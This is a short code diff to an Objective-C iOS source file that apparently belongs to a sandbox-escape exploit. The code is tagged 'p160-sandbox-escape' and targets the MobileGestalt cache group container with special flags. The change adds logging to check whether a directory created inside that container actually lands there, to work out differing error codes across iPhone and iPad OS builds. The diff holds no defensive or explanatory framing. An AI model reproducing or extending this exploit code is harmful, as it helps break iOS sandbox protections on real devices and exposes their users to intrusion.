@@ -27,7 +27,7 @@ extern ssize_t fsgetpath(char *buf, size_t bufsize, fsid_t *fsid, uint64_t objid
 #import <sys/stat.h>
 #import <unistd.h>
 
-#define P160_BUILD @"p160-sandbox-escape-v2d-live-dump"
+#define P160_BUILD @"p160-sandbox-escape-v2e-group-mkdir"
 #define P160_MG_GROUP "systemgroup.com.apple.mobilegestaltcache"
 #define P160_FLAGS UINT64_C(0x8100000000)
 
@@ -630,8 +630,16 @@ static long p160_class7_op2(NSString *target, int mode, NSMutableString *o, NSSt
             [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
             /* Query time needs a REAL directory here. */
             [fm removeItemAtPath:partPath error:nil];
-            [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
-                            attributes:nil error:nil];
+            NSError *mkE = nil;
+            BOOL mkOK = [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
+                            attributes:nil error:&mkE];
+            /* v2e: the 12/23F77 part2 query returned errno=2 (ENOENT) where the
+               iPad/23H30 returned errno=1 — log whether OUR mkdir of the part
+               dir actually lands inside the group container. */
+            [o appendFormat:@"  [v2e] group %@ %@ mkdir=%d exists=%d errno=%ld\n",
+                    gid, leaf,
+                    mkOK, [fm fileExistsAtPath:partPath],
+                    mkE ? (long)mkE.code : (long)errno];
             BOOL queried = NO;
             for (NSNumber *flagNum in flags) {
                 g_p160_flags = flagNum.unsignedLongLongValue;
